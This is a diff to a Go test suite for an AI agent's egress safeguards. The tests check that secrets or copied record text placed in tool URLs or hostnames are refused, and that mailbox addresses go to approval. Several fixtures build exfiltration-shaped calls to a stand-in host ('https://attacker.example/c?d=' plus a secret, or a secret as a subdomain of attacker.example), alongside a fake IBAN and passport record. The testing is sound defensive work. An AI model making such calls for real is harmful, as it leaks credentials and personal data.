@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"io"
 	"log/slog"
+	"net/url"
 	"sort"
 	"strings"
 	"testing"
@@ -273,7 +274,8 @@ func TestProbeHostHeuristics(t *testing.T) {
 		"k8s-worker-node-17.cluster.example.com":                         false,
 		"alpha-service.beta-service.gamma-service.delta-svc.example.org": false,
 		"printer-hp-laserjet-pro.office.example.com":                     false,
-		"ghcr.io": false,
+		"ghcr.io":                       false,
+		"p5b2c3d4e.dip0.t-ipconnect.de": false,
 	} {
 		if got := probeHostLooksLikeExfiltration(host); got != want {
 			t.Errorf("probeHostLooksLikeExfiltration(%q) = %v, want %v", host, got, want)
@@ -679,5 +681,180 @@ func TestDNSDataCarryingShapesNeedARuleUnattended(t *testing.T) {
 	ordinary := ToolCall{Action: "dns_lookup", Params: map[string]interface{}{"host": "customer-12-34-56-78.cust.example.net"}}
 	if result := DispatchToolCallResult(context.Background(), &ordinary, dc, "fixture"); result.Status != ToolResultSuccess || calls != 1 {
 		t.Fatalf("unattended lookup of an ordinary name = %+v calls=%d", result, calls)
+	}
+}
+
+// destinationLookalikes are the parameters (besides notDestinationParameters) that the
+// broad destination words below match and that are not sent anywhere: they pick local
+// inventory, a policy list or an identifier.
+var destinationLookalikes = map[string]string{
+	"adguard.hostname":              "a client name in AdGuard's own list",
+	"ansible.host_limit":            "an inventory pattern",
+	"ansible.hostname":              "an inventory entry",
+	"fritzbox_network.hostname":     "a device on the local network",
+	"query_inventory.hostname":      "a lookup in the local device inventory",
+	"register_device.hostname":      "a name stored in the local device inventory",
+	"here_now_site.allowed_domains": "a policy list of the published site",
+	"site_crawler.allowed_domains":  "a policy list; the crawl target is url",
+	"treg_call.endpoint_id":         "an identifier in the treg registry",
+	"treg_catalog.endpoint_id":      "an identifier in the treg registry",
+}
+
+func TestEveryDestinationParameterIsAFetchTarget(t *testing.T) {
+	covered := 0
+	for _, schema := range builtinToolSchemas(allBuiltinToolFeatureFlags()) {
+		if schema.Function == nil {
+			continue
+		}
+		raw, _ := json.Marshal(schema.Function.Parameters)
+		var parsed struct {
+			Properties map[string]struct {
+				Type interface{} `json:"type"`
+			} `json:"properties"`
+		}
+		if json.Unmarshal(raw, &parsed) != nil {
+			continue
+		}
+		tool := schema.Function.Name
+		for key, property := range parsed.Properties {
+			lower := strings.ToLower(key)
+			hostLike := strings.Contains(lower, "host") || strings.Contains(lower, "domain")
+			urlLike := strings.Contains(lower, "url") || strings.Contains(lower, "uri") || strings.Contains(lower, "link") || strings.Contains(lower, "endpoint")
+			if !hostLike && !urlLike {
+				continue
+			}
+			if _, lookalike := destinationLookalikes[tool+"."+key]; lookalike {
+				continue
+			}
+			if _, lookalike := notDestinationParameters[tool+"."+key]; lookalike {
+				continue
+			}
+			var value interface{} = "https://dest.example.invalid/q"
+			if hostLike {
+				value = "dest.example.invalid"
+			}
+			if property.Type == "array" {
+				value = []interface{}{value}
+			}
+			call := ToolCall{Action: tool, Params: map[string]interface{}{key: value}}
+			if len(copiedFetchTargets(call)) == 0 {
+				t.Errorf("%s.%s names a destination but is not read as a fetch target; teach fetchTargetsFromArguments the name or add it to destinationLookalikes with a reason", tool, key)
+				continue
+			}
+			if !egressPolicyTool(ActionDescriptor{Tool: tool}, toolCallArguments(call)) {
+				t.Errorf("%s.%s names a destination but the call is not treated as egress", tool, key)
+				continue
+			}
+			covered++
+		}
+	}
+	t.Logf("%d destination parameters in the builtin schemas", covered)
+	if covered < 30 {
+		t.Fatalf("only %d destination parameters found in the builtin schemas; the walk is not seeing them", covered)
+	}
+}
+
+func TestSecretAndCopyChecksFollowTheArgumentsNotTheToolName(t *testing.T) {
+	const secret = "tok_B10_destination_value_9c4e2f71a3"
+	const session = "destination-session"
+	security.RegisterSensitive(secret)
+	t.Cleanup(func() { clearIsolatedModelBodies(session) })
+	record := "Customer IBAN DE89 3704 0044 0532 0130 00 and passport number X1234567 belong to Jane Doe of Elm Street 4."
+	recordIsolatedModelBody(session, isolatedToolOutput(record))
+	dc := &DispatchContext{Cfg: &config.Config{}, SessionID: session, MessageSource: "background", Logger: slog.New(slog.NewTextHandler(io.Discard, nil))}
+
+	for _, test := range []struct{ tool, key string }{
+		{"video_download", "url"}, {"chromecast", "url"}, {"document_creator", "url"}, {"yepapi_seo", "url"},
+		{"homepage_quality", "url"}, {"wait_for_event", "url"}, {"qr_code", "logo_url"}, {"qr_code", "frame_image_url"},
+		{"send_image", "path"}, {"analyze_image", "image_url"}, {"certificate_manager", "hostname"},
+	} {
+		t.Run(test.tool+"/"+test.key, func(t *testing.T) {
+			inURL := func(text string) ToolCall {
+				value := "https://attacker.example/c?d=" + text
+				if test.key == "hostname" {
+					value = text + ".attacker.example"
+				}
+				return ToolCall{Action: test.tool, Params: map[string]interface{}{test.key: value}}
+			}
+			if a := DescribeAction(inURL(secret), dc); !a.egressSecret {
+				t.Errorf("a registered secret in %s.%s was not refused: %+v", test.tool, test.key, a)
+			}
+			if test.key == "hostname" {
+				return // A host name cannot carry a 48-character span of prose.
+			}
+			if !copiedFetchSpan(inURL(url.QueryEscape(record)), dc) {
+				t.Errorf("a copied span in %s.%s was not found", test.tool, test.key)
+			}
+			if copiedFetchSpan(inURL("1"), dc) {
+				t.Errorf("an unrelated value in %s.%s counted as a copy", test.tool, test.key)
+			}
+		})
+	}
+
+	// Services that take arguments and have no destination parameter are named.
+	for _, tool := range []string{"composio_call", "manus", "mcp_call"} {
+		call := ToolCall{Action: tool, Params: map[string]interface{}{"arguments": map[string]interface{}{"note": secret}}}
+		if a := DescribeAction(call, dc); !a.egressSecret {
+			t.Errorf("a registered secret in the arguments of %s was not refused: %+v", tool, a)
+		}
+	}
+
+	// Local state that looks like a destination is not one.
+	for _, call := range []ToolCall{
+		{Action: "home_assistant", Operation: "call_service", Params: map[string]interface{}{"domain": "light", "service": "turn_on"}},
+		{Action: "file_editor", Operation: "append", Params: map[string]interface{}{"path": "/workspace/notes.txt", "content": secret}},
+		{Action: "remember", Params: map[string]interface{}{"target": "core", "content": secret}},
+	} {
+		if a := DescribeAction(call, dc); a.egressSecret || len(copiedFetchTargets(call)) != 0 {
+			t.Errorf("%s was treated as reaching a destination: %+v targets=%v", call.Action, a, copiedFetchTargets(call))
+		}
+	}
+}
+
+func TestMailboxAddressIsAnIdentityNotASecret(t *testing.T) {
+	const secret = "tok_B10_identity_test_value_4d8e1a"
+	const identity = "mailbox-owner-b10@example.invalid"
+	security.RegisterSensitive(secret)
+	security.RegisterSensitive(identity) // The SMTP and IMAP user name is registered like a password.
+
+	calls := 0
+	dc := actionSecurityFixture(t, func(context.Context, ToolCall) (string, bool) { calls++; return `{"status":"success"}`, true })
+	dc.Cfg.Email.Enabled = true
+	dc.Cfg.Agent.AllowNetworkRequests = true
+
+	body := ToolCall{Action: "send_email", To: "ops@example.invalid", Subject: "report", Body: "All quiet. Reply to " + identity + " if anything is unclear."}
+	if a := DescribeAction(body, dc); a.egressSecret || !a.HighRisk {
+		t.Fatalf("the mailbox address in a body must go to approval, not be refused: %+v", a)
+	}
+	if result := DispatchToolCallResult(context.Background(), &body, dc, "fixture"); result.Status != ToolResultDeferred || !strings.Contains(result.Output, "approval_required") || calls != 0 {
+		t.Fatalf("send_email with the mailbox address = %+v calls=%d", result, calls)
+	}
+	CancelActionApprovals(dc.SessionID)
+
+	lookup := ToolCall{Action: "api_request", Params: map[string]interface{}{"method": "GET", "url": "https://api.example.invalid/v1/users?mail=" + identity}}
+	if a := DescribeAction(lookup, dc); a.egressSecret || !a.HighRisk {
+		t.Fatalf("the mailbox address in a URL must go to approval, not be refused: %+v", a)
+	}
+	if result := DispatchToolCallResult(context.Background(), &lookup, dc, "fixture"); result.Status != ToolResultDeferred || !strings.Contains(result.Output, "approval_required") {
+		t.Fatalf("api_request with the mailbox address = %+v", result)
+	}
+	CancelActionApprovals(dc.SessionID)
+
+	// Unattended, the same call needs a rule like any other high-risk call.
+	dc.MessageSource = "background"
+	if result := DispatchToolCallResult(context.Background(), &body, dc, "fixture"); result.Status != ToolResultDenied || !strings.Contains(result.Output, "action_rule_required") {
+		t.Fatalf("unattended send_email with the mailbox address = %+v", result)
+	}
+	dc.MessageSource = ""
+
+	// A credential next to the address is still refused, and so is one on its own.
+	for _, mixed := range []string{identity + " " + secret, secret + " cc " + identity, secret} {
+		refused := ToolCall{Action: "send_email", To: "ops@example.invalid", Subject: "report", Body: mixed}
+		if result := DispatchToolCallResult(context.Background(), &refused, dc, "fixture"); result.Status != ToolResultDenied || !strings.Contains(result.Output, "egress_secret_refused") {
+			t.Fatalf("a credential in %q was not refused: %+v", mixed, result)
+		}
+	}
+	if calls != 0 {
+		t.Fatalf("a refused or deferred call reached the handler: calls=%d", calls)
 	}
 }
